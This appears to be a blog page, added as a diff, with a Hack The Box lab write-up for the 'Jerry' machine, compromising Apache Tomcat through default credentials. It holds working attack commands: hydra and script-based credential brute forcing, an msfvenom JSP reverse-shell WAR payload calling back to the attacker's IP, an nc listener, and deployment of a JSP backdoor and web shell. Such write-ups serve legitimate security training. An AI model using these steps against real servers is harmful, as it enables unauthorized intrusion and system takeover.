@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Jerry - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Jerry"><a href="#Hack-The-Box-Jerry" class="headerlink" title="Hack The Box - Jerry"></a>Hack The Box - Jerry</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials. Its IP address is <code>10.10.10.95</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/jerry/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/jerry)
+ |
+ |-->{SFire129}#nmap -p- -T 5 -oA allports 10.10.10.95
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 17:44 EDT
+ Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+ SYN Stealth Scan Timing: About 6.57% done; ETC: 17:50 (0:05:27 remaining)
+ Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+ SYN Stealth Scan Timing: About 96.79% done; ETC: 17:46 (0:00:04 remaining)
+ Nmap scan report for 10.10.10.95
+ Host is up (0.14s latency).
+ Not shown: 65534 filtered ports
+ PORT     STATE SERVICE
+ 8080/tcp open  http-proxy
+ 
+ Nmap done: 1 IP address (1 host up) scanned in 132.29 seconds<br></figure></pre>
+ <p>Run the vulnerability scan with nmap and ports found.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/jerry)
+ |
+ |-->{SFire129}#nmap -p 8080 -sC -sV --script vuln 10.10.10.95
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 17:47 EDT
+ Stats: 0:00:24 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+ NSE Timing: About 50.00% done; ETC: 17:47 (0:00:22 remaining)
+ Pre-scan script results:
+ | broadcast-avahi-dos:
+ |   Discovered hosts:
+ |     224.0.0.251
+ |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+ |_  Hosts are all up (not vulnerable).
+ Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+ NSE Timing: About 97.97% done; ETC: 17:49 (0:00:01 remaining)
+ Nmap scan report for 10.10.10.95
+ Host is up (0.13s latency).
+ 
+ PORT     STATE SERVICE VERSION
+ 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /examples/: Sample scripts
+ |   /manager/html/upload: Apache Tomcat (401 Unauthorized)
+ |   /manager/html: Apache Tomcat (401 Unauthorized)
+ |_  /docs/: Potentially interesting folder
+ |_http-server-header: Apache-Coyote/1.1
+ | http-slowloris-check:
+ |   VULNERABLE:
+ |   Slowloris DOS attack
+ |     State: LIKELY VULNERABLE
+ |     IDs:  CVE:CVE-2007-6750
+ |       Slowloris tries to keep many connections to the target web server open and hold
+ |       them open as long as possible.  It accomplishes this by opening connections to
+ |       the target web server and sending a partial request. By doing so, it starves
+ |       the http server's resources causing Denial Of Service.
+ |
+ |     Disclosure date: 2009-09-17
+ |     References:
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+ |_      http://ha.ckers.org/slowloris/
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 406.17 seconds<br></figure></pre>
+ <p>The output shown some folder over 8080 http port.
+ <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>Find the user and password, download the dictionary for attack from <a class="vglnk"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt"rel="nofollow"><span>dictionary tomcat</span></a>.
+<p>We will need the user and passwords by separete in differents files.
+  <pre><figure class="highlight plain"> |-->{SFire129}#awk -F: '{print $2}' tomcat-betterdefaultpasslist.txt > pass.txt
+ |-------(root@kali)-------|(~/HackTheBox/jerry)
+ |
+ |-->{SFire129}#awk -F: '{print $1}' tomcat-betterdefaultpasslist.txt | uniq > user2.txt
+ |-------(root@kali)-------|(~/HackTheBox/jerry)
+ |
+ |-->{SFire129}#awk -F: '{print $2}' tomcat-betterdefaultpasslist.txt > pass.txt</figure></pre>
+ <p>Run <code>john</code> for brute force attack.
+ <pre><figure class="highlight plain"> |-->{SFire129}#python tomcat-brute.py --host 10.10.10.95 --port 8080 --path /manager/html --usr user2.txt --pwd pass.txt
+ # Target: http://10.10.10.95:8080/manager/html
+ # Usernames: user2.txt
+ # Passwords: pass.txt
+ # Press any key to start ...
+ [*] Trying 'admin:' ...
+ [*] Trying 'ADMIN:' ...
+ [*] Trying 'admin:' ...
+ [*] Trying 'both:' ...
+ [*] Trying 'cxsdk:' ...
+ [*] Trying 'j2deployer:' ...
+ [*] Trying 'manager:' ...
+ [*] Trying 'ovwebusr:' ...
+ [*] Trying 'QCC:' ...
+ [*] Trying 'cxsdk:demo' ...
+ [*] Trying 'j2deployer:demo' ...
+ [*] Trying 'manager:demo' ...
+ [*] Trying 'ovwebusr:demo' ...
+ [*] Trying 'QCC:demo' ...
+ [*] Trying 'role1:demo' ...
+ [*] Trying 'role:demo' ...
+ [*] Trying 'root:demo' ...
+ [*] Trying 'tomcat:demo' ...
+ [*] Trying 'xampp:demo' ...
+ [*] Trying 'server_admin:demo' ...
+ [*] Trying 'admin:demo' ...
+ [*] Trying 'demo:demo' ...
+ ## Summary ##
+ {'admin': 'admin', 'tomcat': 's3cret'}</figure></pre>
+ <p>Run the hydra with original dictionary.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/jerry)
+ |
+ |-->{SFire129}#hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
+ Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+ 
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-11 18:34:41
+ [DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task
+ [DATA] attacking http-get://10.10.10.95:8080/manager/html
+ [8080][http-get] host: 10.10.10.95   login: admin   password: admin
+ [8080][http-get] host: 10.10.10.95   login: admin   password: admin
+ [8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
+ [8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
+ 1 of 1 target successfully completed, 4 valid passwords found
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-11 18:34:43</figure></pre>
+ <p>Both tools show the same result user:tomcat & password:s3cret.
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>Generate the Payload for reverse connection <code>msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4447 -f war > diego.war </code> and deploy in dashboard.
+ <img src="/images/hackthebox/exploit/jerry/2.png" alt=""></p>
+ <p>In the web browser launch attack with nc listener previously.
+ <img src="/images/hackthebox/exploit/jerry/3.png" alt=""></p>
+ <p>Run the ncat listen over 4447 port.
+  <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/jerry)
+ |
+ |-->{SFire129}#nc -nvlp 4447
+ listening on [any] 4447 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.95] 49201
+ Microsoft Windows [Version 6.3.9600]
+ (c) 2013 Microsoft Corporation. All rights reserved.
+ 
+ C:\apache-tomcat-7.0.88>whoami
+ whoami
+ nt authority\system</figure></pre>
+ <p>In this point we have root privileges on system.
+<h2 id="Another-Way-Exploit"><a href="#Another-Way-Exploit" class="Another-Way-Exploit" title="Another-Way-Exploit"></a>Another Way Exploit</h2>
+<p>With the script <a class="vglnk"https://github.com/diegoexploit/tomcatWarDeployer"rel="nofollow"><span>tomcatwarDeployer.py</span></a> we can run attack against tomcat.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/linux)
+ |
+ |-->{SFire129}#python tomcatWarDeployer.py -U tomcat -P s3cret  -H 10.10.14.27 -p 8099 http://10.10.10.95:8080 --unload
+ 
+         tomcatWarDeployer (v. 0.5.2)
+         Apache Tomcat auto WAR deployment & launching tool
+         Mariusz B. / MGeeky '16-18
+ 
+ Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
+ 
+ INFO: Reverse shell will connect to: 10.10.14.27:8099.
+ INFO: Apache Tomcat/7.0.88 Manager Application reached & validated.
+ INFO:   At: "http://10.10.10.95:8080/manager"
+ WARNING: Application with name: "jsp_app" is already deployed.
+ 
+ INFO: WAR DEPLOYED! Invoking it...
+ INFO: ------------------------------------------------------------
+ INFO: JSP Backdoor up & running on http://10.10.10.95:8080/jsp_app/
+ INFO:
+ Happy pwning. Here take that password for web shell: 'SQZTd9TvOi9G'
+ INFO: ------------------------------------------------------------
+ 
+ INFO: Connected with: nt authority\system@JERRY
+ 
+ C:\apache-tomcat-7.0.88>
+ C:\apache-tomcat-7.0.88> dir
+  Volume in drive C has no label.
+  Volume Serial Number is FC2B-E489
+ 
+  Directory of C:\apache-tomcat-7.0.88
+ 
+ 06/13/2020  01:44 AM    DIR          .
+ 06/13/2020  01:44 AM    DIR          ..
+ 06/19/2018  04:06 AM    DIR          bin
+ 06/19/2018  06:47 AM    DIR          conf
+ 06/19/2018  04:06 AM    DIR          lib
+ 05/07/2018  02:16 PM            57,896 LICENSE
+ 06/13/2020  01:53 AM    DIR          logs
+ 05/07/2018  02:16 PM             1,275 NOTICE
+ 05/07/2018  02:16 PM             9,600 RELEASE-NOTES
+ 05/07/2018  02:16 PM            17,454 RUNNING.txt
+ 06/13/2020  01:44 AM            65,234 stager.ps1
+ 06/13/2020  01:18 AM            66,249 stager.xml
+ 06/13/2020  01:34 AM            24,936 stager.xsl
+ 06/12/2020  01:07 AM    DIR          temp
+ 06/13/2020  02:01 AM    DIR          webapps
+ 06/19/2018  04:34 AM    DIR          work
+                7 File(s)        242,644 bytes
+                9 Dir(s)  27,599,769,600 bytes free
+ 
+ C:\apache-tomcat-7.0.88> ipconfig
+ 
+ Windows IP Configuration
+ 
+ Ethernet adapter Ethernet0:
+ 
+    Connection-specific DNS Suffix  . :
+    IPv4 Address. . . . . . . . . . . : 10.10.10.95
+    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+    Default Gateway . . . . . . . . . : 10.10.10.2
+ 
+ Tunnel adapter isatap.{4C9FEAFE-6811-4938-BFB6-5A3280613EF9}:
+ 
+    Media State . . . . . . . . . . . : Media disconnected
+    Connection-specific DNS Suffix  . :
+ 
+ C:\apache-tomcat-7.0.88></figure></pre>
+ <h2 id="Uploading-WebShell"><a href="#Uploading-WebShell" class="Uploading-WebShell" title="Uploading-WebShell"></a>Uploading WebShell</h2>
+ <p>Another web shell in tomcat for run commands with Kali Linux as http server. First download <a class="vglnk"https://github.com/diegoexploit/cmd.jsp"rel="nofollow"><span>cmd.jsp</span></a>, into the folder, delete <code>cmd.war</code> and add the web server Kali IP Address in file cmd.jsp.
+ <img src="/images/hackthebox/exploit/jerry/4.png" alt=""></p>
+ <p>Zip the file with extension <code>.war</code> and run http server.
+ 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/cmd.jsp)
+ |
+ |-->{SFire129}#zip cmd.war cmd.jsp
+   adding: cmd.jsp (deflated 47%)
+   
+ |-------(root@kali)-------|(~/HackTheBox/cmd.jsp)
+ |
+ |-->{SFire129}#python3 -m http.server 80
+ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+ 10.10.14.27 - - [11/Jun/2020 19:28:39] "GET /a.js HTTP/1.1" 200 - </figure></pre>
+<p>Upload the <code>cmd.war</code> and deployed.
+ <img src="/images/hackthebox/exploit/jerry/5.png" alt=""></p>
+ <p>From this web shell could run commands with Kali Linux
+ <img src="/images/hackthebox/exploit/jerry/6.png" alt=""></p>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain">  C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
+ type "2 for the price of 1.txt"
+ user.txt
+ ***Here you could find the user flag.***
+ root.txt
+ ***Here you could find the root flag.***
+ C:\Users\Administrator\Desktop\flags></figure></pre>
+
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-12</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#DefaultCredentials</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Tomcat</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
